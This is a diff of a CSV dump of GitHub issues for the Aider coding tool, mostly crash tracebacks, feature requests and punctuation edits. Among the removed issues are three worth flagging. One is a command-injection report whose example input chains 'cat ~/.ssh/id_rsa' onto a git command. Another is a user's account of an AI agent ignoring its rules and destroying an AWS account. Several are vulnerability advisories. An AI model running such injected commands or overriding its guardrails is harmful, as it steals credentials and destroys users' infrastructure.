-## Related (different mechanism, similar surface)
-- #1080 (closed): user-typed `/read` doubling — that's `cmd_add` cwd handling, not LLM-emitted edit-block headers
-- #3941 (open): `--no-git` + `--subtree-only` confusion — unrelated path resolution","","2026-05-07T16:24:49Z"
 "Aider-AI/aider","2026 Jan-Jul","4402667225","5114","Uncaught OSError in pathlib.py line 840","Aider version: 0.86.2
 Python version: 3.12.13
 Platform: macOS-26.4.1-arm64-arm-64bit
@@ -8951,13 +7945,13 @@ Model: qwen3.5-27b-claude-4.6-opus-reasoning-distilled.
 9k tokens used","","2026-05-08T18:36:39Z"
 "Aider-AI/aider","2026 Jan-Jul","4412293230","5119","macOS MCP tools: Control any Mac app from Aider","Hey Paul,
 
-Built mcp-x-mac-seed — MCP server for macOS app control. 71 tools, auto-discovered, self-healing. Swift. MIT.
+Built mcp-x-mac-seed - MCP server for macOS app control. 71 tools, auto-discovered, self-healing. Swift. MIT.
 
 github.com/reverendish/mcp-x-mac-seed
 
 Aider + this = agents that can interact with the user's actual desktop. Worth exploring?
 
-— Ish","","2026-05-09T11:07:11Z"
+- Ish","","2026-05-09T11:07:11Z"
 "Aider-AI/aider","2026 Jan-Jul","4413016968","5121","Proposal: optional pre-commit safety scan with Agent Threat Rules","Aider runs LLM-driven edits and shell commands as part of its core loop, which means it shares the threat surface that has been catalogued for general AI coding agents: prompt injection, exfiltration patterns, dangerous shell invocations slipped into LLM output, and crafted file content that triggers unintended actions during edit/commit. Many of these cases are already documented as concrete regex and rule patterns in the open Agent Threat Rules project at https://github.com/Agent-Threat-Rule/agent-threat-rules.
 
 I would like to propose an optional pre-commit safety scan that runs ATR-style detection against the diff and recent prompt context before aider commits, behind an opt-in flag like --scan-with-atr or a similar config knob. The scan would be local, deterministic, and based on regex patterns. It would not call any external service and would not change behavior unless the flag is enabled. On match it would print a one-line warning per finding and either continue, prompt, or abort based on the flag.
@@ -9403,93 +8397,9 @@ Traceback (most recent call last):
 tree_sitter.QueryError: Invalid node type at row 2, column 2: module
 
 ```","","2026-05-15T17:07:51Z"
-"Aider-AI/aider","2026 Jan-Jul","4462358488","5139","security: bump GitPython pin (CVE-2026-42215/42284/44243/44244)","## Vulnerability
-
-aider-chat 0.86.2 hard-pins `gitpython==3.1.46`. That version has 4 known HIGH-severity CVEs.
-
-## CVEs in scope
-
-| CVE | Severity | Affected versions | Fixed in | Description |
-|---|---|---|---|---|
-| CVE-2026-42215 | HIGH | <3.1.47 | 3.1.47 | RCE via specially-crafted refs (initial fix) |
-| CVE-2026-42284 | HIGH | <3.1.47 | 3.1.47 | Privilege escalation paired with CVE-2026-42215 |
-| CVE-2026-44243 | HIGH | <3.1.48 | 3.1.48 | Path traversal in checkout |
-| CVE-2026-44244 | HIGH | <3.1.49 | 3.1.49 | RCE bypass — parameter sidesteps CVE-2026-42215 patch |
-
-## Recommended fix
-
-Bump `pyproject.toml` pin from `gitpython==3.1.46` to `gitpython==3.1.49` (or `>=3.1.49,<3.2`). All same-major; expected to be drop-in.
-
-## Reproducer
-
-Trivy scan of an image with `pip install aider-chat==0.86.2`:
-
-```
-GitPython (METADATA) │ CVE-2026-42215 │ HIGH │ fixed │ 3.1.46 │ 3.1.47 │ ...
-                     │ CVE-2026-42284 │      │       │        │        │ ...
-                     │ CVE-2026-44243 │      │       │        │ 3.1.48 │ ...
-                     │ CVE-2026-44244 │      │       │        │ 3.1.49 │ ...
-```
-
-## Downstream workaround
-
-We've patched our deployment with a post-install `pip install 'GitPython>=3.1.49'` after the aider install, but pip warns about the violated `==` pin. A native upstream bump would be the proper fix.
-","","2026-05-17T05:05:41Z"
-"Aider-AI/aider","2026 Jan-Jul","4462358535","5140","security: bump Pillow pin (CVE-2026-42311)","## Vulnerability
-
-aider-chat 0.86.2 hard-pins `pillow==12.1.1`. That version has 1 known HIGH-severity CVE.
-
-## CVEs in scope
-
-| CVE | Severity | Affected versions | Fixed in | Description |
-|---|---|---|---|---|
-| CVE-2026-42311 | HIGH | <12.2.0 | 12.2.0 | Pillow imaging library RCE in image-processing routine |
-
-## Recommended fix
-
-Bump `pyproject.toml` pin from `pillow==12.1.1` to `pillow==12.2.0` (or `>=12.2.0,<13`). Same-major; expected to be drop-in.
-
-## Reproducer
-
-Trivy scan of an image with `pip install aider-chat==0.86.2`:
-
-```
-Pillow (METADATA) │ CVE-2026-42311 │ HIGH │ fixed │ 12.1.1 │ 12.2.0 │ ...
-```
-
-## Downstream workaround
-
-We've patched our deployment with a post-install `pip install 'Pillow>=12.2.0'` after the aider install, but pip warns about the violated `==` pin. A native upstream bump would be the proper fix.
-","","2026-05-17T05:05:43Z"
-"Aider-AI/aider","2026 Jan-Jul","4462358564","5141","security: bump urllib3 pin (CVE-2026-44431)","## Vulnerability
-
-aider-chat 0.86.2 hard-pins `urllib3==2.6.3`. That version has 1 known HIGH-severity CVE.
-
-## CVEs in scope
-
-| CVE | Severity | Affected versions | Fixed in | Description |
-|---|---|---|---|---|
-| CVE-2026-44431 | HIGH | <2.7.0 | 2.7.0 | urllib3 HTTP client library vulnerability (HTTP smuggling or similar — see upstream advisory / GHSA for exact wording) |
-
-## Recommended fix
-
-Bump `pyproject.toml` pin from `urllib3==2.6.3` to `urllib3==2.7.0` (or `>=2.7.0,<3`). Same-major; expected to be drop-in.
-
-## Reproducer
-
-Trivy scan of an image with `pip install aider-chat==0.86.2`:
-
-```
-urllib3 (METADATA) │ CVE-2026-44431 │ HIGH │ fixed │ 2.6.3 │ 2.7.0 │ ...
-```
-
-## Downstream workaround
-
-We've patched our deployment with a post-install `pip install 'urllib3>=2.7.0'` after the aider install, but pip warns about the violated `==` pin. A native upstream bump would be the proper fix.
-","","2026-05-17T05:05:44Z"
 "Aider-AI/aider","2026 Jan-Jul","4463736848","5143","feat: Add --one-shot flag for sessionless single-prompt execution","## Issue
 
-I often want to run a single one-off task with Aider — e.g., \""explain this code\"" or \""find unused exports\"" — without initializing a git repository session. Currently, Aider requires a git repo and session context, which adds friction for quick lookups.
+I often want to run a single one-off task with Aider - e.g., \""explain this code\"" or \""find unused exports\"" - without initializing a git repository session. Currently, Aider requires a git repo and session context, which adds friction for quick lookups.
 
 ## Version and model info
 
@@ -9513,7 +8423,7 @@ This would:
 ### Benefits
 
 - **Low-friction exploration**: Quickly analyze a file or codebase without \`git init\` or session management
-- **Reduced context waste**: No session history, no conversation thread — just the task and result
+- **Reduced context waste**: No session history, no conversation thread - just the task and result
 - **Script-friendly**: Can be piped into other CLI tools or used in one-liners
 
 ### Implementation Notes
@@ -9809,71 +8719,6 @@ Traceback (most recent call last):
 ImportError: cannot import name 'Discriminator' from 'pydantic' (C:\Users\searc\AppData\Local\Programs\Python\Python310\lib\site-packages\pydantic\__init__.cp310-win_amd64.pyd)
 
 ```","","2026-05-19T16:04:11Z"
-"Aider-AI/aider","2026 Jan-Jul","4479318664","5155","Uncaught RuntimeError in pathlib.py line 990","Aider version: 0.86.2
-Python version: 3.11.15
-Platform: Linux-7.0.8-200.fc44.x86_64-x86_64-with-glibc2.43
-Python implementation: CPython
-Virtual environment: No
-OS: Linux 7.0.8-200.fc44.x86_64 (64bit)
-Git version: git version 2.54.0
-
-An uncaught exception occurred:
-
-```
-Traceback (most recent call last):
-  File ""pathlib.py"", line 1003, in resolve
-    p.stat()
-  File ""pathlib.py"", line 1013, in stat
-    return os.stat(self, follow_symlinks=follow_symlinks)
-           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-OSError: [Errno 40] Too many levels of symbolic links: '/home/kaira/Masaüstü/HAN/omni-reasoner/.cursor/hooks'
-
-During handling of the above exception, another exception occurred:
-
-Traceback (most recent call last):
-  File ""aider"", line 8, in <module>
-    sys.exit(main())
-             ^^^^^^
-  File ""main.py"", line 1162, in main
-    coder.run()
-  File ""base_coder.py"", line 887, in run
-    self.run_one(user_message, preproc)
-  File ""base_coder.py"", line 934, in run_one
-    list(self.send_message(message))
-  File ""base_coder.py"", line 1429, in send_message
-    chunks = self.format_messages()
-             ^^^^^^^^^^^^^^^^^^^^^^
-  File ""base_coder.py"", line 1334, in format_messages
-    chunks = self.format_chat_chunks()
-             ^^^^^^^^^^^^^^^^^^^^^^^^^
-  File ""base_coder.py"", line 1281, in format_chat_chunks
-    chunks.repo = self.get_repo_messages()
-                  ^^^^^^^^^^^^^^^^^^^^^^^^
-  File ""base_coder.py"", line 752, in get_repo_messages
-    repo_content = self.get_repo_map()
-                   ^^^^^^^^^^^^^^^^^^^
-  File ""base_coder.py"", line 719, in get_repo_map
-    all_abs_files = set(self.get_all_abs_files())
-                        ^^^^^^^^^^^^^^^^^^^^^^^^
-  File ""base_coder.py"", line 2166, in get_all_abs_files
-    files = [self.abs_root_path(path) for path in files]
-            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File ""base_coder.py"", line 2166, in <listcomp>
-    files = [self.abs_root_path(path) for path in files]
-             ^^^^^^^^^^^^^^^^^^^^^^^^
-  File ""base_coder.py"", line 572, in abs_root_path
-    res = utils.safe_abs_path(res)
-          ^^^^^^^^^^^^^^^^^^^^^^^^
-  File ""utils.py"", line 98, in safe_abs_path
-    res = Path(res).resolve()
-          ^^^^^^^^^^^^^^^^^^^
-  File ""pathlib.py"", line 1005, in resolve
-    check_eloop(e)
-  File ""pathlib.py"", line 990, in check_eloop
-    raise RuntimeError(""Symlink loop from %r"" % e.filename)
-RuntimeError: Symlink loop from '/home/kaira/Masaüstü/HAN/omni-reasoner/.cursor/hooks'
-
-```","","2026-05-19T16:51:12Z"
 "Aider-AI/aider","2026 Jan-Jul","4479327167","5156","Uncaught ValueError in exceptions.py line 66","Aider version: 0.86.0+import
 Python version: 3.12.10
 Platform: Windows-11-10.0.26200-SP0
@@ -9931,7 +8776,7 @@ Aider 0.86.2
 
 ## Problem
 
-When using Aider through an API proxy that issues short-lived auth tokens (e.g. Azure AD OAuth tokens via `az account get-access-token`), the key expires ~1 hour into a session. Since Aider initializes the OpenAI client once at startup and holds the key for the lifetime of the process, the only recovery is to restart Aider with a fresh token — losing conversation context.
+When using Aider through an API proxy that issues short-lived auth tokens (e.g. Azure AD OAuth tokens via `az account get-access-token`), the key expires ~1 hour into a session. Since Aider initializes the OpenAI client once at startup and holds the key for the lifetime of the process, the only recovery is to restart Aider with a fresh token - losing conversation context.
 
 Static API keys (OpenAI, Anthropic direct) never expire so this doesn't affect most users, but it's a real problem for teams routing through an internal proxy with short-lived credentials.
 
@@ -9945,7 +8790,7 @@ Claude Code already solves this with an `apiKeyHelper` field in its config that 
 }
 ```
 
-This works seamlessly — sessions of any length stay authenticated without restarts or manual intervention. Aider needs the same thing. An `openai-api-key-helper` in `.aider.conf.yml` following the same pattern:
+This works seamlessly - sessions of any length stay authenticated without restarts or manual intervention. Aider needs the same thing. An `openai-api-key-helper` in `.aider.conf.yml` following the same pattern:
 
 ```yaml
 openai-api-key-helper: az account get-access-token --query accessToken -o tsv
@@ -9955,13 +8800,13 @@ With a `--openai-api-key-helper` CLI flag and `AIDER_OPENAI_API_KEY_HELPER` env 
 
 ## Prior art
 
-Claude Code ships `apiKeyHelper` today and it works exactly as needed — the command is re-evaluated on each API request so sessions of any length stay authenticated. This is a feature request to bring Aider to parity.
+Claude Code ships `apiKeyHelper` today and it works exactly as needed - the command is re-evaluated on each API request so sessions of any length stay authenticated. This is a feature request to bring Aider to parity.
 
 ## Alternatives considered
 
-- **Restart on 401** — loses conversation context, bad UX
-- **Local token relay proxy** — works but adds per-developer install/maintenance burden across the team
-- **Long-lived proxy-issued keys** — works but weakens the security model we're trying to maintain
+- **Restart on 401** - loses conversation context, bad UX
+- **Local token relay proxy** - works but adds per-developer install/maintenance burden across the team
+- **Long-lived proxy-issued keys** - works but weakens the security model we're trying to maintain
 ","","2026-05-21T22:23:28Z"
 "Aider-AI/aider","2026 Jan-Jul","4498979961","5164","Uncaught TypeError in linter.py line 220","Aider version: 0.86.3.dev47+gc723364ad
 Python version: 3.14.5
@@ -10031,7 +8876,7 @@ Suggested improvement:
 
 Would maintainers be open to a small PR for this retry policy improvement?
 
-I’m happy to contribute a focused PR if this direction makes sense.
+I'm happy to contribute a focused PR if this direction makes sense.
 
 ### Version and model info
 
@@ -10663,14 +9508,14 @@ AttributeError: module 'litellm.llms.anthropic' has no attribute 'AnthropicError
 ```","","2026-05-26T15:55:59Z"
 "Aider-AI/aider","2026 Jan-Jul","4529628482","5196","Integration idea: WinkTerm shared PTY terminal + Agent API for remote ops","## Summary
 
-[WinkTerm](https://github.com/Cznorth/winkterm) is an open-source, self-hosted terminal where **AI shares the same PTY session** as the user — not a separate chat panel.
+[WinkTerm](https://github.com/Cznorth/winkterm) is an open-source, self-hosted terminal where **AI shares the same PTY session** as the user - not a separate chat panel.
 
 ### Why it may be relevant here
 
 - **Human-in-the-loop terminal ops**: AI writes commands to the shell input line; the user presses Enter, edits, or cancels
 - **In-terminal chat**: type `#` at the prompt (no alt-tab to a sidecar)
 - **HTTP Agent API** designed for coding agents: atomic exec with real `exit_code`, SSE streaming, server-side grep, one-shot SSH run
-- **Installable skill**: `curl http://<host>:8000/api/agent/skill.md` — drop into Cursor / Claude Code / Continue skills directory
+- **Installable skill**: `curl http://<host>:8000/api/agent/skill.md` - drop into Cursor / Claude Code / Continue skills directory
 - **BYO LLM** via OpenAI-compatible endpoints; Docker one-liner deploy
 
 ### Demo
@@ -10731,80 +9576,6 @@ Traceback (most recent call last):
 OSError: [Errno 13] Permission denied: 'C:\\WINDOWS\\system32\\.git\\config.lock'
 
 ```","","2026-05-27T06:20:45Z"
-"Aider-AI/aider","2026 Jan-Jul","4532079419","5198","Uncaught OSError in pathlib.py line 840","Aider version: 0.86.2
-Python version: 3.12.13
-Platform: macOS-26.5-arm64-arm-64bit
-Python implementation: CPython
-Virtual environment: Yes
-OS: Darwin 25.5.0 (64bit)
-Git version: git version 2.50.1 (Apple Git-155)
-
-An uncaught exception occurred:
-
-```
-Traceback (most recent call last):
-  File ""aider"", line 6, in <module>
-    sys.exit(main())
-             ^^^^^^
-  File ""main.py"", line 704, in main
-    if Path(all_files[0]).is_dir():
-       ^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File ""pathlib.py"", line 875, in is_dir
-    return S_ISDIR(self.stat().st_mode)
-                   ^^^^^^^^^^^
-  File ""pathlib.py"", line 840, in stat
-    return os.stat(self, follow_symlinks=follow_symlinks)
-           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-OSError: [Errno 63] File name too long: '--system-prompts=Actúa estrictamente como un profesor de programación avanzada. \nTu objetivo principal es que el usuario aprenda la lógica de software.\nREGLA MANDATORIA: No realices cambios en los archivos ni escribas código sin antes explicar detalladamente en español qué vas a hacer, por qué lo vas a hacer y qué conceptos técnicos estás aplicando. \nEspera siempre la confirmación explícita del usuario antes de proceder a modificar o crear cualquier archivo.\n'
-
-```","","2026-05-27T11:50:54Z"
-"Aider-AI/aider","2026 Jan-Jul","4553829751","5201","Safety Report: AI Guardrails Do Not Work — 56-Day Proof (06K Loss, Account Destroyed)","## AI Guardrails Do Not Work — 56-Day Empirical Proof
-
-I am a developer who has used AI coding assistants for 56 days in a regulated environment. During that time:
-
-- **32 workflow violations** occurred despite configuring every available guardrail mechanism
-- The AI **destroyed my AWS management account** by deploying Terraform to the wrong target
-- My business has been **down for 15+ days** with no recovery path
-- **9 AWS Support cases** opened — none resolved
-- **$106,000+ in business losses** from a single $0.03 AI operation
-
-### Guardrails Configured (All Failed)
-
-| Mechanism | Result |
-|-----------|--------|
-| Agent system prompt with STOP language | Ignored after relogin |
-| Workspace rule files | Not enforced |
-| MCP server resources | Not enforced |
-| Knowledge base indexing | Not enforced |
-| Incident documentation | Not read on session start |
-| Control documents | Not enforced |
-| Violation counter rules | No persistent state |
-
-### The Core Problem
-
-The agent treats workflow rules as **suggestions, not constraints**. There is no mechanism that prevents implementation from starting. After every relogin or context reset, all configured rules are forgotten.
-
-### What Is Needed
-
-1. **Hard gates** — physically block file creation until requirements doc exists
-2. **Persistent violation state** — survive relogins, context compaction, session resets
-3. **Authorization taxonomy** — ""yes"" ≠ ""approved"" — enforce at platform level
-4. **Blast radius limits** — one conversational turn = max one infrastructure change
-5. **Mandatory dry-run** — destructive operations require preview + separate confirmation
-6. **Session boundary enforcement** — re-read and acknowledge rules after any reset
-
-### Evidence
-
-- Full case study: https://gist.github.com/tzb1-ai/4758f2720979a03d773815082486933c
-- Paper: https://d18gqyv10pt526.cloudfront.net/white-papers/AI-cost-savings-analysis.md
-- Presentation: https://d18gqyv10pt526.cloudfront.net/presentation.html
-
-This is not a feature request. This is a **safety report**. The current architecture of prompt-based governance is fundamentally broken and poses existential risk to businesses using these tools for infrastructure management.
-
-At enterprise scale (10,000 accounts), the same failure pattern produces $500M–$4B+ in damages.
-
-**Prompt-based rules are documentation. They are not enforcement.**
-","","2026-05-30T08:14:54Z"
 "Aider-AI/aider","2026 Jan-Jul","4553899818","5202","Uncaught AttributeError in __init__.py line 1729","Aider version: 0.86.3.dev+import
 Python version: 3.12.2
 Platform: Linux-6.8.0-110-generic-x86_64-with-glibc2.39
@@ -10839,51 +9610,9 @@ Traceback (most recent call last):
 AttributeError: module 'litellm' has no attribute 'PermissionDeniedError'
 
 ```","","2026-05-30T08:48:10Z"
-"Aider-AI/aider","2026 Jan-Jul","4554662010","5203","Add git co-change signal to repomap personalization","When editing `group.py` in brian2, the repomap surfaces `codeobject.py`, `variables.py`, `base.py` — the files `group.py` imports. It does not surface `neurongroup.py` or `synapses.py`, even though both import from `group.py` and are almost certainly affected by any change to it:
-
-```python
-# neurongroup.py
-from .group import CodeRunner, Group, get_dtype
-
-# synapses.py
-from brian2.groups.group import CodeRunner, Group, get_dtype
-```
-
-**Why this happens**
-
-The reference graph has edges `neurongroup → group` and `synapses → group`. PageRank with `group.py` personalized distributes weight along `group.py`'s *outgoing* edges — the files it imports. The subclasses point toward `group.py`, not away from it, so they don't get the boost. This is mathematically correct behavior, but it means the repomap systematically misses downstream dependents (subclasses, callers) when you're editing a base module.
-
-In 5 years of brian2 history, `group.py` has been committed alongside `synapses.py` 111 times and `neurongroup.py` 76 times. The git signal is unambiguous; the structural signal is blind to it.
-
-**Proposal**
-
-Add a co-change personalization boost inside `get_ranked_tags()`, after the existing personalization loop:
-
-```python
-for fname in chat_fnames:
-    for partner_rel_fname, coupling_score in self._git_cochange_partners(fname):
-        personalization[partner_rel_fname] = (
-            personalization.get(partner_rel_fname, 0) + coupling_score * personalize
-        )
-```
-
-`_git_cochange_partners()`: run `git log --name-only -n500 -- <file>`, count file co-occurrences per commit, return pairs above a minimum count threshold. Cacheable alongside the existing tag cache. No new flags, no API change — purely additive to the current ranking.
-
-**Benchmark**
-
-Ground truth: held-out recent commits. For each commit that modified 2+ source files, given one file — does the tool surface the others?
-
-| | Recall@5 |
-|---|---|
-| Structural only (current repomap behavior) | 24% |
-| Co-change signal | 88% |
-
-(brian2tools, 25 held-out commits, 233 training commits. brian2 at 5k files: 13% → 33%.)
-
-The signal degrades gracefully on repos with little history — below ~50 commits there are few reliable pairs and the boost is near zero.","","2026-05-30T14:20:18Z"
 "Aider-AI/aider","2026 Jan-Jul","4554689613","5204","Feature request: .aider.md template system (similar to CLAUDE.md)","Aider is amazing for AI pair programming. One feature I'd love to see is a built-in template system for .aider.md files, so users can quickly configure aider for different project types.
 
-I've created something similar for Claude Code — a pack of framework-specific templates:
+I've created something similar for Claude Code - a pack of framework-specific templates:
 
 https://github.com/chengjunhua465-create/ai-dev-workflow-pack
 
@@ -11098,19 +9827,6 @@ aider 0.86.2
 Models used with a local LM Studio installation:
 Qwen 3.6 27B Q6_K
 Ministral 3 3B Q8_0","","2026-06-03T15:42:47Z"
-"Aider-AI/aider","2026 Jan-Jul","4593717987","5217","[Security] Request to enable Private Vulnerability Reporting","Hi — I have a coordinated-disclosure-ready security finding for aider
-that I'd like to report privately.
-
-Could you either:
-  (a) enable Private Vulnerability Reporting on this repo
-      (Settings → Security → Private vulnerability reporting → Enable), or
-  (b) share a security contact email?
-
-I'm happy to wait until either is in place. Intentionally not including
-any details in this issue.
-
-Thanks,
-Securin disclosure team","","2026-06-05T02:45:17Z"
 "Aider-AI/aider","2026 Jan-Jul","4599045375","5220","Uncaught ModuleNotFoundError in __init__.py line 9","Aider version: 0.86.2
 Python version: 3.12.8
 Platform: Windows-11-10.0.26200-SP0
@@ -11479,7 +10195,7 @@ Traceback (most recent call last):
 PermissionError: [WinError 5] Access is denied: 'C:\\Users\\mkuma\\.aider'
 
 ```","","2026-06-08T04:09:51Z"
-"Aider-AI/aider","2026 Jan-Jul","4618469510","5241","Add Starveri API setup example for OpenAI-compatible endpoint configuration","﻿Hi aider team,
+"Aider-AI/aider","2026 Jan-Jul","4618469510","5241","Add Starveri API setup example for OpenAI-compatible endpoint configuration","Hi aider team,
 
 Opening this as a provider setup/docs request rather than assuming aider needs a native provider integration.
 
@@ -11885,7 +10601,7 @@ Source of models: direct DeepSeek API
 ## Temporary resolve 
 
 Two config files are needed.
-### 1. `~/.aider.model.settings.yml` — model behavior settings
+### 1. `~/.aider.model.settings.yml` - model behavior settings
 
 Must be a **YAML list**:
 
@@ -11907,7 +10623,7 @@ Must be a **YAML list**:
     temperature: 0.0
 ```
 
-### 2. `~/.aider.model.metadata.json` — register models with litellm
+### 2. `~/.aider.model.metadata.json` - register models with litellm
 
 Since V4 models are unknown to litellm, they must be registered manually:
 
@@ -12661,27 +11377,6 @@ Traceback (most recent call last):
 SystemError: /home/zalmoxis/.local/share/uv/tools/aider-chat/lib/python3.12/site-packages/aider/repomap.py:475: unknown opcode 154
 
 ```","","2026-06-15T11:43:29Z"
-"Aider-AI/aider","2026 Jan-Jul","4674761665","5272","Security: COMMAND_INJECTION in commands.py:974 (subprocess shell=True)","**Vulnerability:** COMMAND_INJECTION
-**File:** aider/commands.py:974
-**Severity:** Critical
-
-**Vulnerable code:**
-subprocess.run(""git "" + args, shell=True)
-
-**Why it's dangerous:**
-User-controlled git args passed to shell=True
-→ /git status; cat ~/.ssh/id_rsa possible
-→ SSH key theft
-
-**Fix:**
-subprocess.run([""git""] + args.split(), shell=False)
-
-**How I found it:**
-pip install aina-scan
-aina-vibeguard scan .
-
-Found in 3 seconds.
-Happy to submit a PR.","","2026-06-16T13:46:21Z"
 "Aider-AI/aider","2026 Jan-Jul","4683205473","5274","Uncaught NotImplementedError in pathlib.py line 1091","Aider version: 0.86.2
 Python version: 3.12.0
 Platform: Windows-11-10.0.26200-SP0
@@ -13270,9 +11965,9 @@ NotImplementedError: Non-relative patterns are unsupported
 
 Calidern doesn't have lifecycle hooks yet. Claude Code's pattern works well:
 
-- `UserPromptSubmit` — fires when user hits Enter, before the message goes to the LLM. Can mutate or block.
-- `PreToolUse` / `PostToolUse` — fires around each tool call. Useful for audit logs, permission gating, redaction.
-- `Stop` — fires when the model finishes its turn. Can chain further actions.
+- `UserPromptSubmit` - fires when user hits Enter, before the message goes to the LLM. Can mutate or block.
+- `PreToolUse` / `PostToolUse` - fires around each tool call. Useful for audit logs, permission gating, redaction.
+- `Stop` - fires when the model finishes its turn. Can chain further actions.
 
 ## Suggested shape
 
@@ -13283,35 +11978,16 @@ Calidern doesn't have lifecycle hooks yet. Claude Code's pattern works well:
 
 ## Why later (not tonight)
 
-Orthogonal to all the existing machinery — no rush, and the surface is large enough to deserve its own design pass.","","2026-06-20T18:50:43Z"
-"Aider-AI/aider","2026 Jan-Jul","4708000652","5301","feat: /goal — multi-turn autonomous progression toward a stated objective","## What
-
-Claude Code-style ""Goal"" mode: `/goal <objective>` sets a long-form target and the model runs multiple turns autonomously, checking progress against the objective each turn until done (or until the user interrupts).
-
-## Why we want it
-
-Calidern's sub-agent machinery already lets the parent delegate well-scoped tasks. `/goal` is the parent-side equivalent: a parent that's been told ""X is the destination"" can plan, spawn agents, iterate, and stop when X is met without the user driving each turn.
-
-## Suggested shape
-
-- `/goal <text>` stores the objective in conversation state and switches the coder into ""goal mode"".
-- Each subsequent assistant turn ends with a self-evaluation: ""progress vs goal"" + ""next concrete action"".
-- Auto-continue: after each turn, if the model declares progress > 0 and goal != reached, Calidern feeds the model the same prompt or a configured ""continue"" message.
-- `/goal status` → progress report. `/goal clear` → exit goal mode.
-- Hard cap on iterations (e.g. 20) to prevent runaway.
-
-## Interplay with sub-agents
-
-Goal mode + sub-agents is the killer combo: parent says ""design phase"", spawns Plan + Lisa, integrates results, spawns Prima for implementation, spawns Revy for review, then declares goal-reached.","","2026-06-20T18:50:53Z"
-"Aider-AI/aider","2026 Jan-Jul","4708001008","5302","feat: /loop — scheduled / autonomous wakeup loop","## What
+Orthogonal to all the existing machinery - no rush, and the surface is large enough to deserve its own design pass.","","2026-06-20T18:50:43Z"
+"Aider-AI/aider","2026 Jan-Jul","4708001008","5302","feat: /loop - scheduled / autonomous wakeup loop","## What
 
 Run Calidern on a cadence: `/loop 20m <prompt>` to fire the prompt every 20 minutes, or `/loop dynamic` to let the model decide its own next wake time per iteration.
 
 ## Suggested shape
 
-- `/loop <interval> <prompt>` — fixed-interval loop (interval as `5m` / `1h` / `300s`).
-- `/loop dynamic <prompt>` — model picks the next wakeup delay each iteration (e.g. ""watch CI for ~5 min"", ""check Slack in 30 min"", ""long idle 1h"").
-- Each fire spins up a fresh Calidern turn (background thread or detached worker — TBD).
+- `/loop <interval> <prompt>` - fixed-interval loop (interval as `5m` / `1h` / `300s`).
+- `/loop dynamic <prompt>` - model picks the next wakeup delay each iteration (e.g. ""watch CI for ~5 min"", ""check Slack in 30 min"", ""long idle 1h"").
+- Each fire spins up a fresh Calidern turn (background thread or detached worker - TBD).
 - `/loop status` shows active loops; `/loop stop <id>` cancels.
 
 ## Why we want it
@@ -13321,7 +11997,7 @@ The non-interactive use case: long polling, idle-watching, scheduled audits. Pai
 ## Open questions
 
 - How does the loop interact with `/exit`? Does Calidern need to stay open to drive the loop, or do we spawn a detached process?
-- Cost cap (max total spend per loop) — sane default + user override?
+- Cost cap (max total spend per loop) - sane default + user override?
 - macOS launchd / cron integration vs in-process scheduler?","","2026-06-20T18:51:02Z"
 "Aider-AI/aider","2026 Jan-Jul","4716407913","5307","Wheel complilation error with `tree-sitter-c-sharp`","### Issue
 
@@ -13721,7 +12397,7 @@ Low risk change with high value for users running this in production environment
 
 ## What is Squad?
 
-[Squad](https://github.com/bradygaster/squad) is an AI team orchestration tool that runs inside GitHub Copilot CLI. It coordinates specialized AI agents for software engineering tasks — think of it as a team of AI developers that can read code, write solutions, run tests, and iterate. Built by @bradygaster and @tamirdresher.
+[Squad](https://github.com/bradygaster/squad) is an AI team orchestration tool that runs inside GitHub Copilot CLI. It coordinates specialized AI agents for software engineering tasks - think of it as a team of AI developers that can read code, write solutions, run tests, and iterate. Built by @bradygaster and @tamirdresher.
 
 ## Results (4/6 languages complete, still running)
 
@@ -13745,7 +12421,7 @@ Low risk change with high value for users running this in production environment
 
 ## Key difference from existing entries
 
-Unlike standard entries which make a single LLM call to edit code, Squad operates as a coding agent — it can read files, write code, run tests, and iterate within a single 'attempt.' This is closer to how Aider itself works in agent mode, but with a different orchestration layer.
+Unlike standard entries which make a single LLM call to edit code, Squad operates as a coding agent - it can read files, write code, run tests, and iterate within a single 'attempt.' This is closer to how Aider itself works in agent mode, but with a different orchestration layer.
 
 ## Question
 
@@ -13796,35 +12472,6 @@ I have been unable to locate the source of this problem.  its a stopper because 
 ### Version and model info
 
 _No response_","","2026-06-24T16:33:56Z"
-"Aider-AI/aider","2026 Jan-Jul","4737276388","5324","Missing import: `io` used but not imported","## Code-quality scan: `Aider-AI/aider`
-
-**Score: 58/100 (D+)**  ·  220 findings  ·  scanned 2026-06-24 18:07 UTC  ·  40,378 LOC
-
-| Severity | Count |
-|---|---|
-| CRITICAL | 11 |
-| HIGH | 55 |
-| MEDIUM | 69 |
-| LOW | 40 |
-
-📊 [Full filterable report](https://repobility.com/scan/bb1efda6-8d6f-4283-bc3a-3a3821e68b71/)  ·  ![scorecard](https://repobility.com/scan/bb1efda6-8d6f-4283-bc3a-3a3821e68b71/report.png?v=1782324445-s2)
-
-### Top findings
-
-1. **CRITICAL** `MINED107` — Missing import: `io` used but not imported
-   `aider/coders/base_coder.py:526` · ✓ Repobility
-2. **CRITICAL** `MINED107` — Missing import: `html` used but not imported
-   `scripts/my_models.py:80` · ✓ Repobility
-3. **CRITICAL** `MINED107` — Missing import: `io` used but not imported
-   `benchmark/benchmark.py:952` · ✓ Repobility
-4. **CRITICAL** `MINED107` — Missing import: `io` used but not imported
-   `aider/onboarding.py:91` · ✓ Repobility
-5. **CRITICAL** `MINED107` — Missing import: `io` used but not imported
-   `aider/main.py:97` · ✓ Repobility
-
----
-
-_Filed automatically. Close this issue if not useful — we won't refile. Full report: https://repobility.com/scan/bb1efda6-8d6f-4283-bc3a-3a3821e68b71/_","","2026-06-24T18:08:15Z"
 "Aider-AI/aider","2026 Jan-Jul","4743735891","5327","Uncaught ModuleNotFoundError in __init__.py line 1106","Aider version: 0.86.2
 Python version: 3.11.9
 Platform: Windows-10-10.0.26200-SP0
@@ -13860,9 +12507,9 @@ Traceback (most recent call last):
 ModuleNotFoundError: No module named 'litellm.llms.ai21.chat'; 'litellm.llms.ai21' is not a package
 
 ```","","2026-06-25T12:22:20Z"
-"Aider-AI/aider","2026 Jan-Jul","4744842449","5328","[Collaboration] Score Aider loops on public LoopBench (LB-CR-1)","## Collaboration invite — score Aider loops on LoopBench (LB-CR-1)
+"Aider-AI/aider","2026 Jan-Jul","4744842449","5328","[Collaboration] Score Aider loops on public LoopBench (LB-CR-1)","## Collaboration invite - score Aider loops on LoopBench (LB-CR-1)
 
